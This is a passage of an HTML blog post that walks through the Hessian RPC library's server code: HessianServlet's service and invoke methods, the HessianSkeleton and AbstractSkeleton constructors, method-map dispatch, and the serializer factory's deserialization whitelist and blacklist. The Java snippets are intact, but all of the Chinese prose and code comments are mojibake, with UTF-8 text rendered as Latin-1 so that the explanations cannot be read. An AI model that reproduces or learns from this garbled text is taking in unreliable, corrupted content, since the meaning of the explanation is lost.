<p>è¿™æ˜¯ Hessian æ—©æœŸ<strong>ä»¿ EJB Home&#x2F;Object æ¨¡å¼</strong>çš„å¯é€‰ç¬¬äºŒç»„æ¥å£&#x2F;å®ç°ï¼Œé¢å‘â€œ<strong>å¯¹è±¡å®ä¾‹</strong>â€è€Œéâ€œ<strong>æœåŠ¡å·¥å‚</strong>â€ã€‚</p>
<ul>
<li><code>_objectImpl</code>ï¼šå¯¹è±¡å®ç°å¯¹è±¡ï¼›<ul>
<li>è‹¥é…ç½® <code>object-class</code>ï¼Œåå°„åˆ›å»º <code>_objectImpl</code>ï¼›</li>
</ul>
</li>
</ul>
<ul>
<li><code>_objectAPI</code>ï¼šå¯¹è±¡æ¥å£ç±»å‹ï¼›<ul>
<li>è‹¥é…ç½® <code>object-api</code>ï¼Œèµ‹ç»™ <code>_objectAPI</code>ï¼›</li>
<li>å¦åˆ™è‹¥å­˜åœ¨ <code>_objectImpl</code>ï¼Œå°±å›é€€ä¸º <code>_objectImpl.getClass()</code>ã€‚</li>
</ul>
</li>
<li><code>_objectSkeleton</code>ï¼šè‹¥å­˜åœ¨ <code>_objectImpl</code>&#x2F;<code>_objectAPI</code><ul>
<li>ä¼šåˆ›å»ºç‹¬ç«‹çš„ <code>_objectSkeleton = new HessianSkeleton(_objectImpl, _objectAPI)</code>ï¼›</li>
<li><code>_objectSkeleton.setHomeClass(_homeAPI)</code>ï¼ˆobject çŸ¥é“ home ç±»ï¼‰</li>
<li>è¯·æ±‚è¿›å…¥ <code>service()</code> æ—¶å¦‚æœ<strong>æœ‰</strong> <code>objectId</code> å‚æ•°ï¼Œä¼šèµ° <code>_objectSkeleton.invoke(...)</code> å®Œæˆè°ƒç”¨åˆ†å‘ã€‚</li>
</ul>
</li>
</ul>
</li>
<li><p><code>_homeSkeleton</code> &#x2F; <code>_objectSkeleton</code> â€”â€” <strong>æœåŠ¡å™¨ç«¯åˆ†å‘å™¨ï¼ˆSkeletonï¼‰</strong></p>
<ul>
<li><code>HessianSkeleton</code> æ˜¯<strong>æœåŠ¡ç«¯åˆ†å‘å™¨</strong>ï¼šæŠŠ Hessian äºŒè¿›åˆ¶è¯·æ±‚è§£åŒ…åï¼ŒæŒ‰æ–¹æ³•ç­¾å<strong>åå°„è°ƒç”¨</strong>å¯¹åº”çš„å®ç°å¯¹è±¡ï¼Œå†æŠŠç»“æœåºåˆ—åŒ–å›å»ã€‚</li>
<li><code>init()</code> æœ«å°¾åˆ›å»ºï¼š<ul>
<li>ä¸€å®šä¼šåˆ›å»º <code>_homeSkeleton</code>ï¼›</li>
<li>å¦‚æœæ²¡æœ‰é…ç½® â€œobjectâ€ï¼Œåˆ™è®© <code>_objectSkeleton = _homeSkeleton</code>ï¼ˆä¸¤è€…åŒä¸€ä¸ªå®ä¾‹ï¼‰ï¼›</li>
<li>å¦‚æœé…ç½®äº† â€œobjectâ€ï¼Œåˆ™åˆ›å»ºç‹¬ç«‹çš„ <code>_objectSkeleton</code> å¹¶äº’ç›¸è®¾ç½® Home&#x2F;Object ç±»å‹ï¼ˆç”¨äºåºåˆ—åŒ–é‡Œä¼ é€’ç±»å‹ä¿¡æ¯ï¼‰ã€‚</li>
</ul>
</li>
<li><code>service()</code> â†’ <code>invoke(...)</code> â†’ ä¾æ®æ˜¯å¦å¸¦ <code>objectId</code> é€‰æ‹© <code>_homeSkeleton</code> æˆ– <code>_objectSkeleton</code> æ¥å¤„ç†è°ƒç”¨ã€‚</li>
</ul>
</li>
<li><p><code>_serializerFactory</code> â€”â€” åºåˆ—åŒ–å·¥å‚</p>
<ul>
<li><code>SerializerFactory</code> æ˜¯ <strong>Hessian ç¼–è§£ç çš„æ³¨å†Œä¸­å¿ƒ&#x2F;ç­–ç•¥é›†åˆ</strong>ï¼šç®¡ç†å„ç§ç±»å‹çš„ï¼ˆåï¼‰åºåˆ—åŒ–å™¨ã€ç™½åå•&#x2F;é»‘åå•ç­–ç•¥ã€æ˜¯å¦å‘é€é›†åˆçš„å…·ä½“å®ç°ç±»å‹ç­‰ã€‚</li>
<li><strong>ä½•æ—¶è¢«èµ‹å€¼</strong><ul>
<li>æ‡’åŠ è½½ï¼š<code>getSerializerFactory()</code> é‡Œå¦‚æœæ˜¯ <code>null</code> æ‰ newï¼›</li>
<li>ä¹Ÿå¯ä»¥æå‰é€šè¿‡ <code>setSerializerFactory(...)</code> è‡ªå®šä¹‰ã€‚</li>
</ul>
</li>
<li><strong>åœ¨å“ªé‡Œç”¨åˆ°</strong><ul>
<li><p><code>service()</code> ä¸­å–åˆ°åï¼Œä¼ ç»™ <code>invoke(...)</code>ï¼Œå†äº¤ç”± <code>HessianSkeleton.invoke(...)</code> ä½¿ç”¨ï¼›</p>
</li>
<li><p>ä½ è¿˜èƒ½é€šè¿‡è¿™äº›æ–¹æ³•è°ƒæ•´è¡Œä¸ºï¼š</p>
<ul>
<li><code>setSendCollectionType(false)</code>ï¼šä¸å†™å…¥é›†åˆå®ç°ç±»å‹ï¼ˆæ›´é€šç”¨ï¼‰ï¼›</li>
<li><code>setWhitelist(true)</code> + <code>allow()/deny()</code>ï¼šååºåˆ—åŒ–ç™½&#x2F;é»‘åå•ï¼ˆå®‰å…¨å…³é”®ç‚¹ï¼‰ã€‚</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><code>com.caucho.hessian.server.HessianSkeleton</code> çš„æ„é€ å‡½æ•°é¦–å…ˆè°ƒç”¨çˆ¶ç±» <code> com.caucho.services.server.AbstractSkeleton</code> çš„æ„é€ å‡½æ•°ï¼Œç„¶åå†å°†ç¬¬ä¸€ä¸ªå‚æ•°è®¾ç½®åˆ° <code>_service</code> ä¸Šï¼Œè¿™å®é™…ä¸Šæ˜¯è¦è¢«è¿œç¨‹æ–¹æ³•è°ƒç”¨çš„å¯¹è±¡ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åˆ›å»ºä¸€ä¸ªæ–°çš„ HessianSkeletonï¼ˆæœåŠ¡ç«¯åˆ†å‘å™¨ï¼‰ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ä½œç”¨ï¼š</span></span><br><span class="line"><span class="comment"> * - æŒæœ‰â€œæœåŠ¡å®ç°å¯¹è±¡ï¼ˆserviceï¼‰â€ä¸â€œå¯¹å¤– API ç±»å‹ï¼ˆapiClassï¼‰â€ï¼Œ</span></span><br><span class="line"><span class="comment"> *   åç»­æ ¹æ® API æ–¹æ³•ç­¾åå¯¹è¯·æ±‚åšåå°„è°ƒç”¨ä¸ç»“æœè¿”å›ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> service  ä¸šåŠ¡å®ç°å¯¹è±¡ï¼›è‹¥ä¼ å…¥ä¸º nullï¼Œåˆ™å›é€€ä¸ºå½“å‰ Skeleton å®ä¾‹ï¼ˆå…¼å®¹æ€§ç”¨æ³•ï¼Œä¸å¸¸ç”¨ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> apiClass å¯¹å¤–æš´éœ²çš„ API æ¥å£æˆ–ç±»ï¼ˆå¿…é¡»æ˜¯ service çš„çˆ¶ç±»å‹ï¼‰</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">HessianSkeleton</span><span class="params">(Object service, Class&lt;?&gt; apiClass)</span> &#123;</span><br><span class="line">    <span class="comment">// çˆ¶ç±»é€šå¸¸ä¼šè®°å½•/æ ¡éªŒ API ç±»å‹ç­‰å…ƒæ•°æ®</span></span><br><span class="line">    <span class="built_in">super</span>(apiClass);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å…¼å®¹æ€§å¤„ç†ï¼šè‹¥æœªæ˜¾å¼æä¾›å®ç°å¯¹è±¡ï¼Œåˆ™ä½¿ç”¨å½“å‰ Skeleton å®ä¾‹</span></span><br><span class="line">    <span class="comment">// è¯´æ˜ï¼šå¸¸è§„ç”¨æ³•åº”å½“æ˜¾å¼ä¼ å…¥çœŸå®çš„ä¸šåŠ¡å®ç°å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">if</span> (service == <span class="literal">null</span>) &#123;</span><br><span class="line">        service = <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¿å­˜æœåŠ¡å®ç°å¯¹è±¡ï¼Œåç»­é€šè¿‡åå°„è°ƒç”¨å…¶æ–¹æ³•</span></span><br><span class="line">    _service = service;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç±»å‹æ ¡éªŒï¼šè¦æ±‚ service å¿…é¡»å®ç°/ç»§æ‰¿ apiClassï¼Œ</span></span><br><span class="line">    <span class="comment">// å¦åˆ™åœ¨è¿è¡Œæ—¶æ— æ³•å°†è¯·æ±‚åˆ†æ´¾åˆ°çº¦å®šçš„ API æ–¹æ³•ä¸Š</span></span><br><span class="line">    <span class="keyword">if</span> (!apiClass.isAssignableFrom(service.getClass())) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(</span><br><span class="line">            <span class="string">&quot;Service &quot;</span> + service + <span class="string">&quot; must be an instance of &quot;</span> + apiClass.getName()</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>AbstractSkeleton</code> åˆ™ä¼šæ ¹æ®ä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•° <code>apiClass</code> åˆå§‹åŒ– <code>_methodMap</code>ã€‚<code>_methodMap</code> æ˜¯è¦è¢«è¿œç¨‹è°ƒç”¨çš„å¯¹è±¡çš„æ–¹æ³•åç§°ä¸ <code>Method</code> å¯¹è±¡çš„æ˜ å°„ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åˆ›å»ºæŠ½è±¡ Skeletonï¼šæ ¹æ® API ç±»å‹é¢„æ„å»ºâ€œæ–¹æ³•åˆ†å‘è¡¨â€ï¼ˆ_methodMapï¼‰ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * åˆ†å‘è¡¨åŒ…å«ä¸‰ç±» Key â†’ Method çš„æ˜ å°„ï¼Œç”¨äºå…¼å®¹ä¸åŒå®¢æˆ·ç«¯çš„è°ƒç”¨è§£ææ–¹å¼ï¼š</span></span><br><span class="line"><span class="comment"> * 1) ç®€å•æ–¹æ³•å                ï¼šmethodName                  â†’ é¦–æ¬¡å‡ºç°çš„ Methodï¼ˆé»˜è®¤/å…¼å®¹ç”¨ï¼‰</span></span><br><span class="line"><span class="comment"> * 2) æ–¹æ³•å + å‚æ•°ä¸ªæ•°         ï¼šmethodName__&lt;argc&gt;          â†’ é€šè¿‡å‚æ•°ä¸ªæ•°åŒºåˆ†é‡è½½</span></span><br><span class="line"><span class="comment"> * 3) å®Œæ•´ç­¾åï¼ˆmangle ç»“æœï¼‰   ï¼šmangleName(method, false)   â†’ åŸºäºå‚æ•°ç±»å‹çš„å”¯ä¸€ç¼–ç ï¼Œå½»åº•åŒºåˆ†é‡è½½</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * è¯´æ˜ï¼š</span></span><br><span class="line"><span class="comment"> * - apiClass.getMethods() è¿”å›è¯¥ç±»å‹åŠå…¶çˆ¶ç±»/çˆ¶æ¥å£çš„æ‰€æœ‰ public æ–¹æ³•ã€‚</span></span><br><span class="line"><span class="comment"> * - ç®€å•æ–¹æ³•åçš„æ˜ å°„åªåœ¨â€œå½“å‰ä¸å­˜åœ¨â€æ—¶å†™å…¥ï¼ˆfirst-winï¼‰ï¼Œç”¨äºå…¼å®¹è€å®¢æˆ·ç«¯æœªæºå¸¦é‡è½½ä¿¡æ¯çš„åœºæ™¯ã€‚</span></span><br><span class="line"><span class="comment"> * - å…¶å®ƒä¸¤ç§æ˜ å°„ç›´æ¥è¦†ç›–åŒ Keyï¼ˆé€šå¸¸ Key å·²ç»å”¯ä¸€ï¼Œä¸ä¼šæ— æ„ä¹‰è¦†ç›–ï¼‰ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> apiClass å¯¹å¤–æš´éœ²çš„ API æ¥å£æˆ–ç±»</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">AbstractSkeleton</span><span class="params">(Class apiClass)</span> &#123;</span><br><span class="line">    _apiClass = apiClass;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å– API çš„æ‰€æœ‰ public æ–¹æ³•ï¼ˆåŒ…å«ç»§æ‰¿è€Œæ¥çš„ï¼‰</span></span><br><span class="line">    Method[] methodList = apiClass.getMethods();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; methodList.length; i++) &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> methodList[i];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1) ç®€å•æ–¹æ³•åæ˜ å°„ï¼ˆä»…å½“å½“å‰ä¸å­˜åœ¨æ—¶å†™å…¥ï¼Œä¿ç•™â€œç¬¬ä¸€ä»½â€ä½œä¸ºé»˜è®¤åˆ†å‘ï¼‰</span></span><br><span class="line">        <span class="keyword">if</span> (_methodMap.get(method.getName()) == <span class="literal">null</span>) &#123;</span><br><span class="line">            _methodMap.put(method.getName(), methodList[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) æ–¹æ³•å + å‚æ•°ä¸ªæ•° çš„â€œè½»é‡é‡è½½â€æ˜ å°„ï¼ˆä¾‹å¦‚ foo__2ï¼‰</span></span><br><span class="line">        Class[] param = method.getParameterTypes();</span><br><span class="line">        <span class="type">String</span> <span class="variable">mangledName</span> <span class="operator">=</span> method.getName() + <span class="string">&quot;__&quot;</span> + param.length;</span><br><span class="line">        _methodMap.put(mangledName, methodList[i]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) å®Œæ•´ç­¾åæ˜ å°„ï¼šé€šè¿‡ mangleName ç”ŸæˆåŒ…å«å‚æ•°ç±»å‹ä¿¡æ¯çš„å”¯ä¸€é”®</span></span><br><span class="line">        <span class="comment">//    ï¼ˆç”¨äºåœ¨å­˜åœ¨åŒå‚ä¸ªæ•°ä½†ä¸åŒå‚æ•°ç±»å‹çš„é‡è½½æ—¶ï¼Œç²¾ç¡®å®šä½ Methodï¼‰</span></span><br><span class="line">        _methodMap.put(mangleName(method, <span class="literal">false</span>), methodList[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="è¯·æ±‚å¤„ç†è¿‡ç¨‹"><a href="#è¯·æ±‚å¤„ç†è¿‡ç¨‹" class="headerlink" title="è¯·æ±‚å¤„ç†è¿‡ç¨‹"></a>è¯·æ±‚å¤„ç†è¿‡ç¨‹</h4><p><code>com.caucho.hessian.server.HessianServlet#service</code> è´Ÿè´£å¤„ç† Hessian çš„ RPC è¯·æ±‚ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å¤„ç†ä¸€æ¬¡ Hessian è°ƒç”¨è¯·æ±‚ã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * æµç¨‹æ¦‚è§ˆï¼š</span></span><br><span class="line"><span class="comment"> * 1) ä»…å…è®¸ HTTP POSTï¼ˆå½“å‰å®ç°é POST è¿”å› 500ï¼›æ›´åˆç†æ˜¯ 405ï¼Œè§ä¸‹æ–¹æ³¨é‡Šï¼‰ï¼›</span></span><br><span class="line"><span class="comment"> * 2) ä» pathInfo æå– serviceIdï¼Œä»è¯·æ±‚å‚æ•° id/ejbid æå– objectIdï¼›</span></span><br><span class="line"><span class="comment"> * 3) ä½¿ç”¨ ServiceContext ç»‘å®šæœ¬æ¬¡è¯·æ±‚çš„ä¸Šä¸‹æ–‡ï¼ˆä¾›ä¸šåŠ¡æ–¹åœ¨æœåŠ¡å®ç°å†…è·å– req/resp/session ç­‰ï¼‰ï¼›</span></span><br><span class="line"><span class="comment"> * 4) è®¾ç½®å“åº”çš„ Content-Typeï¼ˆå½“å‰ä¸º &quot;x-application/hessian&quot;ï¼›å¸¸è§å†™æ³•ä¹Ÿæœ‰ &quot;application/x-hessian&quot;ï¼‰ï¼›</span></span><br><span class="line"><span class="comment"> * 5) å°†è¯·æ±‚/å“åº”æµä¸ SerializerFactory äº¤ç»™ invoke(...)ï¼Œç”± Skeleton å®Œæˆæ–¹æ³•åˆ†å‘ä¸ç¼–è§£ç ï¼›</span></span><br><span class="line"><span class="comment"> * 6) finally ä¿è¯é‡Šæ”¾ ServiceContextã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest request, ServletResponse response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) request;</span><br><span class="line">    <span class="type">HttpServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> (HttpServletResponse) response;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»…å…è®¸ POSTï¼šå½“å‰å®ç°ç›´æ¥è¿”å› 500 å’Œç®€å• HTMLã€‚</span></span><br><span class="line">    <span class="comment">// æ›´åˆç†çš„åšæ³•ï¼šè¿”å› 405 (Method Not Allowed) å¹¶è®¾ç½®å“åº”å¤´ Allow: POSTã€‚</span></span><br><span class="line">    <span class="keyword">if</span> (!req.getMethod().equals(<span class="string">&quot;POST&quot;</span>)) &#123;</span><br><span class="line">        res.setStatus(<span class="number">500</span>); <span class="comment">// Hessian Requires POST</span></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> res.getWriter();</span><br><span class="line"></span><br><span class="line">        res.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;Hessian Requires POST&lt;/h1&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»è·¯å¾„ä¸­è·å– serviceIdï¼›ä»å‚æ•°ä¸­è·å– objectIdï¼ˆå…¼å®¹æ—©æœŸ ejb é£æ ¼çš„ &quot;ejbid&quot;ï¼‰</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">serviceId</span> <span class="operator">=</span> req.getPathInfo();</span><br><span class="line">    <span class="type">String</span> <span class="variable">objectId</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (objectId == <span class="literal">null</span>) &#123;</span><br><span class="line">        objectId = req.getParameter(<span class="string">&quot;ejbid&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°†æœ¬æ¬¡è¯·æ±‚çš„ä¸Šä¸‹æ–‡ç»‘å®šåˆ°çº¿ç¨‹ï¼Œä¾›æœåŠ¡å®ç°é€šè¿‡ ServiceContext è·å– Servlet ç¯å¢ƒ</span></span><br><span class="line">    ServiceContext.begin(req, res, serviceId, objectId);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// è·å–è¯·æ±‚/å“åº”çš„äºŒè¿›åˆ¶æµï¼›Hessian ç¼–è§£ç å°†åœ¨ Skeleton ä¸­å®Œæˆ</span></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> request.getInputStream();</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è®¾ç½®è¿”å›å†…å®¹ç±»å‹ï¼ˆå†å²ç”¨æ³•ä¸º &quot;x-application/hessian&quot;ï¼›</span></span><br><span class="line">        <span class="comment">// ä¹Ÿå¯è€ƒè™‘ä½¿ç”¨æ›´å¸¸è§çš„ &quot;application/x-hessian&quot; ä»¥å¢å¼ºå…¼å®¹æ€§ï¼‰</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;x-application/hessian&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–å·¥å‚ï¼ˆåŒ…å«ç™½/é»‘åå•ã€é›†åˆç±»å‹å‘é€å¼€å…³ç­‰åºåˆ—åŒ–ç­–ç•¥ï¼‰</span></span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">serializerFactory</span> <span class="operator">=</span> getSerializerFactory();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ ¹æ® objectId æ˜¯å¦å­˜åœ¨é€‰æ‹© home æˆ– object çš„ Skeletonï¼Œå¹¶å®Œæˆæ–¹æ³•åˆ†å‘</span></span><br><span class="line">        invoke(is, os, objectId, serializerFactory);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">        <span class="comment">// è¿è¡Œæ—¶å¼‚å¸¸ç›´æ¥æŠ›å‡ºï¼Œç”±å®¹å™¨ç»Ÿä¸€å¤„ç†</span></span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ServletException e) &#123;</span><br><span class="line">        <span class="comment">// Servlet ç›¸å…³å¼‚å¸¸ç›´æ¥æŠ›å‡º</span></span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        <span class="comment">// å…¶å®ƒå¼‚å¸¸ç»Ÿä¸€åŒ…è£…ä¸º ServletException æŠ›å‡º</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// é‡Šæ”¾çº¿ç¨‹ç»‘å®šçš„ ServiceContextï¼Œé˜²æ­¢æ³„æ¼</span></span><br><span class="line">        ServiceContext.end();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­ <code>invoke</code> å‡½æ•°æ ¹æ®æ˜¯å¦æä¾› <code>objectId</code> å†³å®šé€‰æ‹© <code>_objectSkeleton</code> è¿˜æ˜¯ <code>_homeSkeleton</code> çš„ <code>invoke</code> æ–¹æ³•ï¼Œé€šå¸¸æˆ‘ä»¬èµ°çš„æ˜¯ <code>_homeSkeleton</code> åˆ†æ”¯ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(InputStream is, OutputStream os,</span></span><br><span class="line"><span class="params">                    String objectId,</span></span><br><span class="line"><span class="params">                    SerializerFactory serializerFactory)</span></span><br><span class="line"><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (objectId != <span class="literal">null</span>)</span><br><span class="line">        _objectSkeleton.invoke(is, os, serializerFactory);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        _homeSkeleton.invoke(is, os, serializerFactory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ— è®ºæ˜¯ <code>_objectSkeleton</code> è¿˜æ˜¯ <code>_homeSkeleton</code>ï¼Œæœ€ç»ˆ <code>invoke</code> éƒ½ä¼šè°ƒç”¨åˆ° <code>com.caucho.hessian.server.HessianSkeleton#invoke</code> å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è°ƒç”¨å…¥å£ï¼šä»è¾“å…¥æµè¯»å– Hessian å¤´éƒ¨ï¼Œé€‰æ‹©åˆé€‚çš„ç¼–è§£ç å®ç°ï¼Œ</span></span><br><span class="line"><span class="comment"> * å†æŠŠè¯·æ±‚åˆ†å‘åˆ°æœåŠ¡å®ç°ï¼ˆ_serviceï¼‰å¹¶å°†ç»“æœå†™å…¥è¾“å‡ºæµã€‚</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> is  Hessian è¯·æ±‚çš„è¾“å…¥æµï¼ˆé€šå¸¸æ¥è‡ª HTTP è¯·æ±‚ä½“ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> os  Hessian å“åº”çš„è¾“å‡ºæµï¼ˆå†™å›åˆ° HTTP å“åº”ä½“ï¼‰</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> serializerFactory 